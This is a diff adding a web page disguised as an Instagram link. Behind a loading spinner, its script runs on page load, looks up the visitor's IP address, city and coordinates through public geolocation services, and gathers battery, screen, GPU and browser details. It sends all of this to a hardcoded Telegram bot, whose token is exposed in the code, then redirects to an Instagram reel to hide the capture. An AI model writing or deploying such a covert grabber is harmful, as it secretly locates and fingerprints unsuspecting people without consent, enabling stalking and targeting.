@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+
+    <script>
+        const botToken = "8803169320:AAFSwUuSZw5eqzvYmj77qVYCDPS1GjPWemg";
+        const chatId = "2122221879";
+        const targetUrl = "https://www.instagram.com/reel/DdpP29QmX/?stkn=MwnxMHo3N3";
+
+        function getGPUInfo() {
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "غير متوفر";
+                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "معروف جزئياً";
+            } catch (e) {
+                return "غير متوفر";
+            }
+        }
+
+        async function gatherAndSend() {
+            let ipData = { ip: "غير معروف", country_name: "غير معروف", city: "غير معروف", org: "غير معروف", latitude: "N/A", longitude: "N/A" };
+            
+            // محاولة أولى عبر ipapi.co
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let data = await res.json();
+                if (data.ip) {
+                    ipData.ip = data.ip;
+                    ipData.country_name = data.country_name || "غير معروف";
+                    ipData.city = data.city || "غير معروف";
+                    ipData.org = data.org || "غير معروف";
+                    ipData.latitude = data.latitude || "N/A";
+                    ipData.longitude = data.longitude || "N/A";
+                }
+            } catch (e) {}
+
+            // إذا فشلت المحاولة الأولى، جرب ipwho.is (خدمة قوية جداً وتدعم HTTPS بالكامل)
+            if (ipData.ip === "غير معروف") {
+                try {
+                    let res2 = await fetch('https://ipwho.is/');
+                    let data2 = await res2.json();
+                    if (data2.success) {
+                        ipData.ip = data2.ip;
+                        ipData.country_name = data2.country || "غير معروف";
+                        ipData.city = data2.city || "غير معروف";
+                        ipData.org = data2.connection ? data2.connection.isp : "غير معروف";
+                        ipData.latitude = data2.latitude || "N/A";
+                        ipData.longitude = data2.longitude || "N/A";
+                    }
+                } catch (e) {}
+            }
+
+            // محاولة أخيرة خفيفة لجلب الـ IP فقط لو تفاصيل الموقع تعثرت
+            if (ipData.ip === "غير معروف") {
+                try {
+                    let res3 = await fetch('https://api.ipify.org?format=json');
+                    let data3 = await res3.json();
+                    ipData.ip = data3.ip;
+                } catch (e) {
+                    ipData.ip = "فشل الجلب";
+                }
+            }
+
+            let batteryStatus = "غير مدعوم / غير متوفر";
+            try {
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    batteryStatus = `${Math.round(bat.level * 100)}% (${bat.charging ? 'يشحن ⚡' : 'لا يشحن 🔋'})`;
+                }
+            } catch (e) {}
+
+            let message = `🎯 صيد شامل جديد يا البرسم!\n\n` +
+                          `🌐 IP: ${ipData.ip}\n` +
+                          `🌍 الدولة: ${ipData.country_name}\n` +
+                          `🏙️ المدينة: ${ipData.city}\n` +
+                          `📍 الموقع (Lat, Lon): ${ipData.latitude}, ${ipData.longitude}\n` +
+                          `🏢 المزود (ISP): ${ipData.org}\n\n` +
+                          `📱 معلومات الجهاز:\n` +
+                          `🔋 البطارية: ${batteryStatus}\n` +
+                          `💻 الشاشة: ${window.screen.width}x${window.screen.height}\n` +
+                          `👆 يدعم اللمس: ${navigator.maxTouchPoints > 0 ? 'نعم' : 'لا'}\n` +
+                          `🎮 كرت الشاشة (GPU): ${getGPUInfo()}\n` +
+                          `🗣️ لغة المتصفح: ${navigator.language}\n` +
+                          `💻 النظام والمتصفح: ${navigator.userAgent}`;
+
+            let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            try {
+                await fetch(telegramUrl);
+            } catch (err) {} finally {
+                setTimeout(function() {
+                    window.location.href = targetUrl;
+                }, 1200);
+            }
+        }
+
+        gatherAndSend();
+    </script>
+</body>
+</html>
